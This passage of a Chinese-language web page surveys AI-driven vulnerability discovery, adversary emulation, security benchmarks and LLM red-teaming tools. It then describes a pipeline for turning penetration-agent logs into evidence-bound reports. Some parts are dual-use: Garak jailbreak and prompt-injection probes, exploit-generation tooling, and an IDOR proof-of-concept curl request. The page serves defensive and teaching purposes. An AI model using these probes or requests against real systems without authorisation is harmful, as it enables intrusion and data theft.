+    <!-- ===== 漏洞发现与修复 ===== -->
+    <article class="card" data-cat="disc">
+      <div class="card-h"><h3>Atlantis</h3><span class="tag disc">AIxCC 冠军</span></div>
+      <p class="meta">Team Atlanta（GT + Samsung + KAIST）</p>
+      <p class="desc">DARPA AIxCC 决赛后的开源 CRS（网络推理系统）：自主找洞 → 生成 patch → 构造 PoC 输入验证。工程成熟度远超一般 GitHub 项目。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>高（多容器编排）</dd>
+        <dt>适合</dt><dd>C/C++ 项目自动化漏洞发现与修补</dd>
+        <dt>痛点</dt><dd>面向赛题接口，改造成业务流水线要下功夫</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code><span class="c"># 官方以容器交付，通过 REST + SSE 与赛题侧交互</span>
+docker compose up -d
+
+<span class="c"># 提交源码包 → CRS 自主分析 → 返回 patch + PoC 输入</span>
+<span class="c"># 接口形态与端口见仓库文档，不同 CRS 差异较大</span>
+</code></pre>
+        <p class="note"><strong>用法示意</strong>。这四套 CRS 的价值在于"patch 生成 + 验证闭环"的架构，直接抄设计比抄代码划算。</p>
+      </details>
+    </article>
+
+    <article class="card" data-cat="disc">
+      <div class="card-h"><h3>Buttercup</h3><span class="tag disc">AIxCC</span></div>
+      <p class="meta">Trail of Bits</p>
+      <p class="desc">Trail of Bits 的 CRS，风格务实：静态分析 + LLM 定位 + 补丁生成，附大量工程化工具链，文档质量在四套里最好。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>高</dd>
+        <dt>适合</dt><dd>想读懂"LLM 怎么定位内存安全 bug"</dd>
+        <dt>痛点</dt><dd>依赖重</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code>git clone https://github.com/trailofbits/buttercup
+<span class="c"># 阅读顺序建议：先看它的 patch pipeline，再看 fuzz harness 生成</span>
+<span class="c"># 单独的工具组件可拆出来用（如 PoC 生成、崩溃去重）</span>
+</code></pre>
+        <p class="note"><strong>用法示意</strong>。团队博客里的技术复盘比代码更好读，建议一起看。</p>
+      </details>
+    </article>
+
+    <article class="card" data-cat="disc">
+      <div class="card-h"><h3>ARTIPHISHELL</h3><span class="tag disc">AIxCC</span></div>
+      <p class="meta">Shellphish / UC Santa Barbara</p>
+      <p class="desc">Shellphish 的 CRS。这支队伍的传统强项是二进制与漏洞利用，所以它在"把 crash 变成可利用 PoC"这段最值得挖。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>高</dd>
+        <dt>适合</dt><dd>研究自动化利用生成（AEG）</dd>
+        <dt>痛点</dt><dd>组件多、耦合紧</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code><span class="c"># 关注点：从 fuzz 出来的 crash → 可利用性判定 → PoC 构造</span>
+<span class="c"># 该链路可单独抽出，接你自己的 fuzz 平台</span>
+</code></pre>
+        <p class="note"><strong>用法示意</strong>。</p>
+      </details>
+    </article>
+
+    <article class="card" data-cat="disc">
+      <div class="card-h"><h3>RoboDuck</h3><span class="tag disc">AIxCC</span></div>
+      <p class="meta">Theori</p>
+      <p class="desc">Theori 的 CRS。Theori 本身是攻防强队，这套系统的多 agent 协作（侦察 / 分析 / 打补丁分工）设计得比较清爽，适合照抄架构。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>高</dd>
+        <dt>适合</dt><dd>多 agent 分工架构参考</dd>
+        <dt>痛点</dt><dd>—</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code><span class="c"># 后 AIxCC 时代四套 CRS 均已开源，建议横向对比：</span>
+<span class="c">#   Atlantis     —— 整体最均衡，冠军方案</span>
+<span class="c">#   Buttercup    —— 文档与工程规范最好</span>
+<span class="c">#   ARTIPHISHELL —— 利用生成最强</span>
+<span class="c">#   RoboDuck     —— 多 agent 编排最清晰</span>
+</code></pre>
+      </details>
+    </article>
+
+    <article class="card" data-cat="disc">
+      <div class="card-h"><h3>Vulnhuntr</h3><span class="tag disc">最能落地</span></div>
+      <p class="meta">Protect AI</p>
+      <p class="desc">LLM 做 Python 零样本 SAST，但只报"可远程触达"的洞：从入口点反向追调用链，把大量不可达告警直接去掉。思路值得抄。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>低</dd>
+        <dt>适合</dt><dd>Python 项目上线前扫一遍、写报告引用</dd>
+        <dt>痛点</dt><dd>仅 Python；大仓库 token 成本高</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code>pip install vulnhuntr
+export ANTHROPIC_API_KEY=...
+
+vulnhuntr -r /path/to/repo -a claude -l DEBUG
+</code></pre>
+        <p class="note">它的输出结构（漏洞位置 + 调用链 + 为什么可达）就是一份好的 finding 模板，可直接搬进报告 schema。</p>
+      </details>
+    </article>
+
+    <article class="card" data-cat="disc">
+      <div class="card-h"><h3>OSS-Fuzz-Gen</h3><span class="tag disc">Google</span></div>
+      <p class="meta">Google · 与 OSS-Fuzz 集成</p>
+      <p class="desc">用 LLM 自动为项目生成 / 迭代 fuzz target 和 seed，提升覆盖率。属于"AI 放大传统手段"，副作用小、收益真实。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>高（要能编目标项目）</dd>
+        <dt>适合</dt><dd>C/C++ 库的长期漏洞挖掘</dd>
+        <dt>痛点</dt><dd>构建环境重</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code><span class="c"># 概念流程（非直接可运行）：</span>
+<span class="c"># 1. 提供项目名 + 目标函数签名</span>
+<span class="c"># 2. LLM 生成 fuzz harness 源码</span>
+<span class="c"># 3. 自动 build + 跑覆盖率 + 反馈迭代</span>
+<span class="c"># 4. 覆盖率不涨就重新生成</span>
+</code></pre>
+        <p class="note">这类"窄而深"的用法，比端到端 agent 更接近真实生产价值。</p>
+      </details>
+    </article>
+
+    <article class="card" data-cat="disc">
+      <div class="card-h"><h3>EnIGMA</h3><span class="tag disc">CTF/RE</span></div>
+      <p class="meta">UIUC / SWE-agent 团队</p>
+      <p class="desc">解决一个很实际的问题：模型写不出一次到位的漏洞利用脚本。它把调试器、反汇编、检索做成交互工具，让模型"边看边改"。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>中</dd>
+        <dt>适合</dt><dd>CTF、逆向、需要交互式调试的任务</dd>
+        <dt>痛点</dt><dd>偏研究</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code><span class="c"># 核心思路：把 gdb / objdump / IDA 包装成 agent 可反复调用的工具</span>
+<span class="c"># 而不是让模型"猜"内存布局</span>
+pip install sweagent
+<span class="c"># 具体包名与入口以 EnIGMA 仓库为准</span>
+</code></pre>
+        <p class="note"><strong>用法示意</strong>。做逆向类 agent 的话，这个思路几乎是必选项。</p>
+      </details>
+    </article>
+
+    <!-- ===== 对抗模拟 ===== -->
+    <article class="card" data-cat="emu">
+      <div class="card-h"><h3>CALDERA</h3><span class="tag emu">MITRE</span></div>
+      <p class="meta">MITRE · 开源</p>
+      <p class="desc">自动化对抗模拟（adversary emulation）的事实标准。本身不是 LLM，但是最好的"动作空间"来源：插件化 ability + ATT&CK 映射。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>中</dd>
+        <dt>适合</dt><dd>紫队演练、给 agent 提供攻击原子操作</dd>
+        <dt>痛点</dt><dd>LLM planner 是社区插件，非官方核心</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code>git clone https://github.com/mitre/caldera &amp;&amp; cd caldera
+pip install -r requirements.txt
+python server.py --insecure --build
+
+<span class="c"># UI: https://localhost:8888   默认账号 red / admin（首登强制改密）</span>
+<span class="c"># 加载 LLM planner 插件后可下"高层面目标"，由 agent 生成 adversary 链</span>
+</code></pre>
+        <p class="note">把 LLM 放在 planner 层、执行仍走既有 ability，是风险最低的"AI + 红队"组合方式。</p>
+      </details>
+    </article>
+
+    <article class="card" data-cat="emu">
+      <div class="card-h"><h3>Atomic Red Team</h3><span class="tag emu">动作库</span></div>
+      <p class="meta">Red Canary</p>
+      <p class="desc">ATT&CK 原子测试库，每条 technique 一个小测试。常被 agent 当作动作空间，也是"报告里说打了什么"的可验证依据。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>低</dd>
+        <dt>适合</dt><dd>检测覆盖验证、写报告时引用 ATT&CK ID</dd>
+        <dt>痛点</dt><dd>不含 AI，需要自己接</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code>git clone https://github.com/redcanaryco/atomic-red-team
+<span class="c"># 单条 technique 的 atomics 定义在 YAML 里，字段结构化，</span>
+<span class="c"># 非常适合直接喂给 agent 当 function 定义</span>
+</code></pre>
+      </details>
+    </article>
+
+    <!-- ===== 评测 ===== -->
+    <article class="card" data-cat="bench">
+      <div class="card-h"><h3>Cybench</h3><span class="tag bench">通用基线</span></div>
+      <p class="meta">Stanford / 社区 · 40+ CTF 任务</p>
+      <p class="desc">最常用的通用基线。不跑它就没法说"我的 agent 比 PentestGPT 强"。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>低</dd>
+        <dt>适合</dt><dd>横向对比、快速出分</dd>
+        <dt>痛点</dt><dd>CTF 与真实项目差距大</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code>pip install inspect-ai
+inspect eval cybench --model anthropic/claude-sonnet-4
+<span class="c"># 或在 Cybench 仓库内用自带的 docker harness</span>
+</code></pre>
+        <p class="note"><strong>用法示意</strong>。</p>
+      </details>
+    </article>
+
+    <article class="card" data-cat="bench">
+      <div class="card-h"><h3>BountyBench</h3><span class="tag bench">赏金三阶段</span></div>
+      <p class="meta">Stanford · 真实赏金项目</p>
+      <p class="desc">把"发现 → 利用 → 打补丁"三段分开评，还带美元金额维度。最接近真实项目形态的基准之一。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>中</dd>
+        <dt>适合</dt><dd>评估端到端价值，而非刷分</dd>
+        <dt>痛点</dt><dd>环境重</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code><span class="c"># 关注它的三段式评分：detect / exploit / patch</span>
+<span class="c"># 很多 agent 在 detect 上好看，exploit 段直接归零</span>
+<span class="c"># 通过率最能说明"报告里能不能标 confirmed"</span>
+</code></pre>
+      </details>
+    </article>
+
+    <article class="card" data-cat="bench">
+      <div class="card-h"><h3>AutoPenBench</h3><span class="tag bench">端到端</span></div>
+      <p class="meta">学术 · Docker 化靶场</p>
+      <p class="desc">端到端渗透基准，自动化环境构建 + 分级难度，适合衡量"完整链路"而不是单点能力。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>中</dd>
+        <dt>适合</dt><dd>agent 迭代时的回归评测</dd>
+        <dt>痛点</dt><dd>任务数量有限</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code><span class="c"># 通常以 docker compose 起靶场，再跑自己的 agent 适配层</span>
+<span class="c"># 关键是指标定义：成功率 / 步数 / token 成本 / 人类干预次数</span>
+</code></pre>
+      </details>
+    </article>
+
+    <article class="card" data-cat="bench">
+      <div class="card-h"><h3>CyberGym</h3><span class="tag bench">真实 CVE</span></div>
+      <p class="meta">UC Berkeley 等</p>
+      <p class="desc">大规模真实 CVE 复现环境，评"能不能真打出洞"。比 CTF 更贴近生产漏洞形态。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>高</dd>
+        <dt>适合</dt><dd>严谨评估"真实可利用性"</dd>
+        <dt>痛点</dt><dd>资源消耗大</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code><span class="c"># 提供的核心是"可复现的 CVE 环境 + 判定器"</span>
+<span class="c"># 用法以仓库文档为准；重点是拿它做 PoC 验证闸门</span>
+</code></pre>
+      </details>
+    </article>
+
+    <article class="card" data-cat="bench">
+      <div class="card-h"><h3>NYU CTF Bench / CVE-Bench</h3><span class="tag bench">补充</span></div>
+      <p class="meta">NYU / 社区</p>
+      <p class="desc">前者规模更大、带 hint 分级（能测"给提示后能不能爬起来"）；后者专注真实 CVE 的利用能力。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>中</dd>
+        <dt>适合</dt><dd>区分"能力不足"还是"不会用工具"</dd>
+        <dt>痛点</dt><dd>—</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code><span class="c"># hint 分级的用法：同一题跑三次</span>
+<span class="c">#  无提示 / 弱提示 / 强提示</span>
+<span class="c"># 差值大 → 工具与接口问题；都低 → 模型能力问题</span>
+</code></pre>
+        <p class="note">这个诊断维度比单纯看成功率有用得多。</p>
+      </details>
+    </article>
+
+    <!-- ===== LLM 红队 ===== -->
+    <article class="card" data-cat="llm">
+      <div class="card-h"><h3>Garak</h3><span class="tag llm">NVIDIA</span></div>
+      <p class="meta">NVIDIA · Apache-2.0</p>
+      <p class="desc">扫 LLM 自身弱点（越狱、提示注入、数据泄露）的"nmap"。探针 + 检测器分离，可扩展。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>低</dd>
+        <dt>适合</dt><dd>给自研模型/agent 做安全验收</dd>
+        <dt>痛点</dt><dd>打的是模型，不是网络</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code>pip install garak
+garak --model_type openai --model_name gpt-4o \
+      --probes promptinject,dan,encoding \
+      --report_prefix run1
+</code></pre>
+        <p class="note">如果你部署的渗透 agent 本身接了外部输入，先跑一遍这个再上线。</p>
+      </details>
+    </article>
+
+    <article class="card" data-cat="llm">
+      <div class="card-h"><h3>PyRIT</h3><span class="tag llm">Microsoft</span></div>
+      <p class="meta">Microsoft · 风险识别工具包</p>
+      <p class="desc">编排式红队框架：orchestrator + converter + scorer 三段，适合写可复现的自动化攻击脚本。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>中（要写代码）</dd>
+        <dt>适合</dt><dd>系统性、可回归的模型安全测试</dd>
+        <dt>痛点</dt><dd>API 变动较快</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code>from pyrit.orchestrator import PromptSendingOrchestrator
+from pyrit.prompt_target import OpenAIChatTarget
+
+target = OpenAIChatTarget()
+orch = PromptSendingOrchestrator(objective_target=target)
+<span class="c"># 循环送 prompt，再由 scorer 判定是否命中</span>
+</code></pre>
+        <p class="note"><strong>用法示意</strong>，以官方 notebook 为准。</p>
+      </details>
+    </article>
+
+    <article class="card" data-cat="llm">
+      <div class="card-h"><h3>promptfoo</h3><span class="tag llm">CI 友好</span></div>
+      <p class="meta">开源 · 声明式配置</p>
+      <p class="desc">把红队测试写进 CI 的最快路径：YAML 配置、插件化攻击、结果可视化对比。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>低</dd>
+        <dt>适合</dt><dd>模型应用持续回归</dd>
+        <dt>痛点</dt><dd>深度攻击需自定义插件</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code>npx promptfoo@latest redteam init
+npx promptfoo@latest redteam run
+npx promptfoo@latest redteam report
+</code></pre>
+      </details>
+    </article>
+
+    <article class="card" data-cat="llm">
+      <div class="card-h"><h3>PurpleLlama / CyberSecEval</h3><span class="tag llm">Meta</span></div>
+      <p class="meta">Meta · 基准 + 防护</p>
+      <p class="desc">CyberSecEval 系列是"模型会不会帮人写攻击代码"的基准，PurpleLlama 里还有 Llama Guard 等防护组件。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>中</dd>
+        <dt>适合</dt><dd>评估模型安全对齐、做准入测试</dd>
+        <dt>痛点</dt><dd>偏模型侧</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code><span class="c"># 典型用法：把候选模型接入 CyberSecEval 的测试子集</span>
+<span class="c"># 关注 4 个维度：不安全代码生成、攻击辅助、</span>
+<span class="c">#             漏洞利用、提示注入鲁棒性</span>
+</code></pre>
+        <p class="note">选型时用它筛"能不能拿来做红队 agent"，比看榜单靠谱。</p>
+      </details>
+    </article>
+
+  </div>
+
+  <p class="empty" id="empty" hidden>没有匹配的项目。试试更短的关键词，或点「全部 29」重置。</p>
+</section>
+
+<section id="report">
+  <h2><span class="num">03 / REPORT PIPELINE</span>从 agent 日志到一份能交付的渗透报告</h2>
+  <p class="sub">
+    这是 agent 项目最容易糊弄过去的一段：<em>生成</em>很便宜，<em>可信</em>很贵。核心矛盾是——模型天生擅长把推测写成既定事实，
+    而报告的法律与工程价值 100% 来自「每条结论都能指回一条原始证据」。所以下面这套流水线的重点不是让模型写得更好看，
+    而是让它在没有证据时<strong>写不出来</strong>。
+  </p>
+
+  <h3 style="margin:26px 0 6px;font-size:17px">3.1 流水线：九步，而不是"让模型写个报告"</h3>
+  <div class="pipe">
+    <div class="step"><b>采集</b><span>nmap / nuclei / ffuf / 浏览器 / agent shell 的原始 stdout 与 HTTP 报文，全部落盘</span></div>
+    <div class="step"><b>归一化</b><span>转成统一 artifact 记录：类型、来源工具、时间戳、目标、内容哈希</span></div>
+    <div class="step"><b>抽取</b><span>LLM 按严格 schema 输出候选 finding，<em>只允许引用已有 artifact id</em></span></div>
+    <div class="step"><b>证据绑定</b><span>校验每个 evidence_id 存在且哈希一致；不一致即降级</span></div>
+    <div class="step"><b>复现回放</b><span>PoC 在隔离环境重放，成功才可标 confirmed</span></div>
+    <div class="step"><b>定级</b><span>CVSS 向量由模型给、分数由代码算；再叠加业务影响</span></div>
+    <div class="step"><b>去重合并</b><span>同根因合并，保留最强证据；跨资产同类问题聚合</span></div>
+    <div class="step"><b>人审</b><span>高危与"业务影响"结论必须人签，标注审核人</span></div>
+    <div class="step out"><b>渲染交付</b><span>同一份数据出三套：执行摘要 / 技术复现 / 修复工单</span></div>
+  </div>
+
+  <div class="callout"><strong>为什么不能跳过 4 和 5：</strong>一份标了 "confirmed" 但复现不出来的高危漏洞，在客户那边造成的信任损失，比漏报十个洞更大。宁可写 "hypothesis（待人工验证）"，也不要虚标。</div>
+
+  <h3 style="margin:34px 0 6px;font-size:17px">3.2 Finding 的字段：先定 schema，再谈生成</h3>
+  <p class="sub" style="margin-bottom:14px">下面这套字段是对 Vulnhuntr 输出结构与 BountyBench 三阶段评分的折中，够用且能被自动校验。</p>
+  <div class="tablewrap">
+    <table>
+      <thead><tr><th>字段</th><th>类型</th><th>谁产生</th><th>规则（不能妥协的部分）</th></tr></thead>
+      <tbody>
+        <tr><td><code>id</code></td><td>字符串</td><td>系统</td><td>分配后永不变更，跨轮次复用（回归时靠它对账）</td></tr>
+        <tr><td><code>asset</code></td><td>字符串</td><td>系统</td><td>必须是 host / URL / <code>repo@commit</code>，禁止自然语言描述</td></tr>
+        <tr><td><code>confidence</code></td><td>枚举</td><td>闸门计算</td><td><code>confirmed</code> / <code>likely</code> / <code>hypothesis</code>；<strong>模型无权自封 confirmed</strong></td></tr>
+        <tr><td><code>evidence_ids</code></td><td>字符串数组</td><td>模型选、系统验</td><td>每个 id 必须真实存在且内容哈希匹配</td></tr>
+        <tr><td><code>cvss_vector</code></td><td>字符串</td><td>模型给</td><td>只要向量，分数由代码算；模型直接给分数一律丢弃</td></tr>
+        <tr><td><code>attack_path</code></td><td>有序数组</td><td>模型</td><td>只允许写「做了什么 → 观察到什么」，不允许写「可能可以」</td></tr>
+        <tr><td><code>poc</code></td><td>字符串</td><td>模型生成、系统回放</td><td>可执行的 curl / python / nuclei 模板</td></tr>
+        <tr><td><code>remediation</code></td><td>字符串</td><td>模型 + 人</td><td>必须指向具体组件或代码位置，禁止「加强安全意识」这类废话</td></tr>
+        <tr><td><code>retest</code></td><td>枚举</td><td>系统</td><td><code>open</code> / <code>fixed</code> / <code>regressed</code> / <code>n/a</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3 style="margin:34px 0 6px;font-size:17px">3.3 五道闸门：把幻觉挡在交付之前</h3>
+  <ol class="gates">
+    <li><span class="n">1</span><div><b>Schema 闸门</b><p>结构化输出（JSON schema / pydantic）+ 严格模式。不合规直接拒收重试，不做「尽力解析」——宽松解析是幻觉的温床。</p></div></li>
+    <li><span class="n">2</span><div><b>证据闸门</b><p>每条陈述必须挂 <code>evidence_id</code>。挂不上的不删除，而是降级成 <code>hypothesis</code> 并显式标注「未验证线索」——保住线索，也保住诚实。</p></div></li>
+    <li><span class="n">3</span><div><b>复现闸门</b><p>标 <code>confirmed</code> 的前提是 PoC 在干净环境里重放成功，且有第二次成功的记录。一次成功可能是缓存、可能是残留会话。</p></div></li>
+    <li><span class="n">4</span><div><b>定级闸门</b><p>CVSS 分数只从向量计算得出，模型不参与算术。业务影响另起字段，由人补——那是人的判断，不是模型的。</p></div></li>
+    <li><span class="n">5</span><div><b>人审闸门</b><p>高危 / Critical、以及任何「影响客户数据」的表述必须人工签字。报告里记录审核人与审核时间，这既是质量也是责任边界。</p></div></li>
+  </ol>
+
+  <h3 style="margin:34px 0 6px;font-size:17px">3.4 生成骨架（示意代码）</h3>
+  <p class="sub" style="margin-bottom:6px">下面的代码只演示结构：结构化输出 → 证据校验 → 定级计算。真实项目里把 <code>store</code> 换成你的 artifact 数据库。</p>
+<pre><code><span class="c"># 骨架示例，非可直接运行</span>
+import hashlib
+from typing import Literal
+from pydantic import BaseModel
+
+class Evidence(BaseModel):
+    id: str
+    kind: Literal["http", "stdout", "file"]
+    ref: str          <span class="c"># 原始日志中的定位串</span>
+    sha256: str       <span class="c"># 与 ref 内容绑定，防后期改写</span>
+
+class Finding(BaseModel):
+    id: str
+    title: str
+    asset: str
+    cwe: str | None = None
+    cvss_vector: str | None = None
+    confidence: Literal["confirmed", "likely", "hypothesis"] = "hypothesis"
+    evidence_ids: list[str] = []
+    attack_path: list[str] = []
+    poc: str | None = None
+    remediation: str = ""
+
+<span class="c"># 闸门 4：分数只能由向量算出</span>
+def severity_from_vector(vector: str) -&gt; str:
+    score = cvss4_score(vector)      <span class="c"># 引入 cvss 计算库</span>
+    if score &gt;= 9.0: return "critical"
+    if score &gt;= 7.0: return "high"
+    if score &gt;= 4.0: return "medium"
+    if score &gt; 0.0:  return "low"
+    return "info"
+
+<span class="c"># 闸门 2：证据对不上就降级，不删除</span>
+def gate(f: Finding, store: dict[str, Evidence]) -&gt; Finding:
+    valid = [e for e in f.evidence_ids if e in store]
+    if len(valid) != len(f.evidence_ids) or not valid:
+        f.confidence = "hypothesis"
+        f.attack_path.append("【未验证】原始证据缺失或被改写")
+    f.evidence_ids = valid
+    return f
+</code></pre>
+
+  <h3 style="margin:34px 0 6px;font-size:17px">3.5 同一条 finding，三种受众三套写法</h3>
+  <p class="sub" style="margin-bottom:6px">这是报告"有用性"的关键：老板要一句话，工程师要能复现，运维要能直接派单。用同一份数据渲染三次，不要写三份。</p>
+
+  <div class="tabs" data-tabs>
+    <div class="tablist" role="tablist" aria-label="报告受众视图">
+      <button class="tab" role="tab" id="t1" aria-controls="p1" aria-selected="true" type="button">执行摘要 · 管理层</button>
+      <button class="tab" role="tab" id="t2" aria-controls="p2" aria-selected="false" type="button">技术复现 · 工程师</button>
+      <button class="tab" role="tab" id="t3" aria-controls="p3" aria-selected="false" type="button">修复工单 · 运维</button>
+    </div>
+    <div class="tabpanel" role="tabpanel" id="p1" aria-labelledby="t1" tabindex="0">
+      <h4>示例：订单接口越权（IDOR）</h4>
+      <div class="doc">
+        <div class="h">F-007 · High · 已复现 · 涉及客户数据</div>
+        <p style="margin:0 0 8px"><strong>一句话：</strong>登录用户可读取<strong>其他客户</strong>的订单详情，包含姓名、地址、手机号。已在测试环境复现，无需特殊权限，只要有任意有效账号。</p>
+        <ul>
+          <li><strong>业务风险：</strong>涉及个人身份信息，命中隐私合规的高风险条款；若有自动化脚本可批量遍历，属于「可规模化泄露」。</li>
+          <li><strong>建议优先级：</strong>本次唯一建议在 72 小时内修复的项。</li>
+          <li><strong>为什么可信：</strong>附两次独立复现记录与原始 HTTP 报文，非扫描推测。</li>
+        </ul>
+      </div>
+      <p class="note">管理层视图<strong>不出现</strong>URL、payload、CWE 编号。出现即失焦。</p>
+    </div>
+    <div class="tabpanel" role="tabpanel" id="p2" aria-labelledby="t2" tabindex="0">
+      <h4>同一 finding 的技术视图</h4>
+      <div class="doc">
+        <div class="h">F-007 · CWE-639 · CVSS:4.0/AV:N/AC:L/PR:L/UI:N/… · confidence=confirmed</div>
+        <p style="margin:0 0 6px"><strong>复现步骤</strong></p>
+        <ol style="margin:0 0 10px;padding-left:20px;font-size:13.8px">
+          <li>用账号 A 登录，取得会话 Cookie。</li>
+          <li>请求 <code>GET /api/v2/orders/1042</code>，其中 1042 属于账号 B。</li>
+          <li>响应 200 且返回 B 的收货信息 —— 服务端只校验登录态，未校验资源归属。</li>
+        </ol>
+        <pre style="margin-top:6px"><code>curl -s 'https://staging.example.com/api/v2/orders/1042' \
+  -H 'Cookie: session=A的会话' | jq '.shipping'
+<span class="c"># 证据：evidence_id=ev-3f21  sha256=9c1b…  抓取于 10-30 14:02:11Z</span></code></pre>
+        <p class="note" style="margin-top:10px"><strong>证据绑定：</strong>上面那段输出必须能在 artifact 库里按 <code>ev-3f21</code> 找到原文，否则这条只能算 hypothesis。</p>
+      </div>
+    </div>
+    <div class="tabpanel" role="tabpanel" id="p3" aria-labelledby="t3" tabindex="0">
+      <h4>同一 finding 的工单视图</h4>
+      <div class="doc">
+        <div class="h">标题：订单详情接口缺少资源归属校验（越权读取）</div>
+        <ul>
+          <li><strong>组件：</strong><code>services/order-api</code> · <code>handlers/order_detail.go:118</code>（如为白盒）</li>
+          <li><strong>修复方案：</strong>在资源查询条件中加入 <code>owner_id = 当前会话用户</code>；对已存在的越权访问补审计日志。</li>
+          <li><strong>验收标准：</strong>账号 A 请求账号 B 的 order_id 返回 403/404；回归用例 <code>tests/idor_order_test.py</code> 通过。</li>
+          <li><strong>优先级 / SLA：</strong>P1 · 72 小时 · 责任人待指派</li>
+          <li><strong>关联：</strong>F-007 ↔ ATT&amp;CK 不适用 / 检测规则见「报告利用」第 3 条</li>
+        </ul>
+      </div>
+      <p class="note">工单视图的关键是<strong>验收标准可执行</strong>——它同时也是下一轮复测的判定条件。</p>
+    </div>
+  </div>
+
+  <h3 style="margin:34px 0 6px;font-size:17px">3.6 一次完整跑通的最小流程</h3>
+  <p class="sub" style="margin-bottom:6px">把上面五步串成命令链。<code>report.py</code> 是你自己写的那层胶水，不是现成工具——这块目前没有开箱即用的开源方案，只能自己拼。</p>
+<pre><code><span class="c"># ① 采集：扫描器统一输出 jsonl，原始文件不可篡改地落盘</span>
+nuclei -l targets.txt -severity low,medium,high,critical -jsonl -o artifacts/raw/nuclei.jsonl
+
+<span class="c"># ② 抽取：模型按严格 schema 输出候选 finding（只允许引用已有 artifact）</span>
+python report.py extract --artifacts artifacts/ --out findings.json \
+    --schema schema/finding.schema.json --strict
+
+<span class="c"># ③ 闸门：证据校验 + CVSS 算术 + 定级，不通过就降级成 hypothesis</span>
+python report.py gate --findings findings.json --store artifacts/ --out gated.json
+
+<span class="c"># ④ 复现：在隔离环境重放 PoC，两次成功才给 confirmed</span>
+python report.py replay --findings gated.json --sandbox docker://replay-runner --repeat 2
+
+<span class="c"># ⑤ 渲染：同一份数据出三套视图</span>
+python report.py render --findings gated.json --out dist/ --views exec,tech,ticket
+</code></pre>
+  <p class="note">关键在第 ③ 步：闸门应该是<strong>独立的、确定性的代码</strong>，不能又是一次模型调用——用模型去检查模型，等于没检查。</p>
+
+  <div class="callout">
+    <strong>LLM 在报告环节最容易犯的错：叙事化。</strong>它会把「nmap 看到 22 端口开着」写成「存在 SSH 弱口令风险」，把推测包装成结论。
+    唯一有效的对抗手段是<strong>形式约束</strong>（必须引用证据 id），而不是在提示词里写「请不要幻觉」——后者基本无效。
+  </div>
+</section>
+
+<section id="use">
+  <h2><span class="num">04 / WHAT THE REPORT IS FOR</span>报告生成之后，才是它开始干活的时候</h2>
+  <p class="sub">很多团队把报告当交付终点：PDF 一发，项目结案。实际上它是五条不同流程的输入源。下面每条都给出「怎么落」而不是「应该做」。</p>
+
+  <div class="cols">
+    <div class="panel">
+      <h3>① 客户交付与复测</h3>
+      <ul>
+        <li><b>时间盒：</b>高危 72 小时、中危 30 天、低危下一迭代。写进报告首页，别写进附录。</li>
+        <li><b>复测对照：</b>用固定 <code>id</code> 对账，输出「已修复 / 未修复 / 回归」三态表，而不是重新写一份报告。</li>
+        <li><b>差额说明：</b>新发现的洞必须单独成节，否则客户会怀疑你在凑数。</li>
+      </ul>
+    </div>
+    <div class="panel">
+      <h3>② 工单化（Jira / Linear / 飞书）</h3>
+      <ul>
+        <li><b>一条 finding 一张单</b>，标题用「现象 + 组件」，不用 CVE 编号做主标题。</li>
+        <li><b>字段映射：</b><code>severity</code> → 优先级，<code>asset</code> → 组件，<code>remediation</code> → 描述，<code>poc</code> → 复现步骤。</li>
+        <li><b>幂等：</b>用 <code>id</code> 做去重键，避免每轮渗透都重复建单。</li>
+      </ul>
+    </div>
+    <div class="panel">
+      <h3>③ 检测工程（蓝队验证）</h3>
+      <ul>
+        <li>把 finding 的攻击行为翻成检测规则：Sigma / KQL / EDR 查询。</li>
+        <li>然后用同一套 attacker 在靶场回放，看规则<b>是否触发</b>——这就是紫队闭环。</li>
+        <li><b>价值：</b>红队报告从「一次性交付」变成「检测覆盖率的增量」。</li>
+      </ul>
+    </div>
+    <div class="panel">
+      <h3>④ 合规映射</h3>
+      <ul>
+        <li>等保 2.0 控制项、ISO 27001 A.8、PCI-DSS 6.3、SOC 2 CC7。</li>
+        <li>报告里加一列「对应控制项」，审计时直接引用，不用重新解释。</li>
+        <li>注意：<b>映射是解释，不是背书</b>——别把「做了渗透测试」写成「已合规」。</li>
+      </ul>
+    </div>
+    <div class="panel">
+      <h3>⑤ 固化成回归用例</h3>
+      <ul>
+        <li>能写成 nuclei 模板的就写模板；业务逻辑洞写成 pytest / 集成测试。</li>
